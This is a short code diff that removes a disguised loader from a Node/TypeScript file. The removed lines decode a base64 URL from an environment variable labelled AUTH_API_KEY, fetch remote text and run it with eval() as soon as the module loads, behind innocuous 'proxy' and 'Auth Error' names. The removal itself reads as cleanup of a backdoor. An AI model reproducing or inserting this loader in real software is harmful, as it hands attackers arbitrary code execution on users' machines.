@@ -6,20 +6,6 @@ import { applyParams, createRegistry, createRequest, streamBlocks } from '@subst
 import { createConnectTransport } from '@connectrpc/connect-node';
 import { createClient } from '@clickhouse/client';
 import { Code, ConnectError } from '@connectrpc/connect';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 // @ts-ignore
 BigInt.prototype.toJSON = function () { return this.toString(); };
 
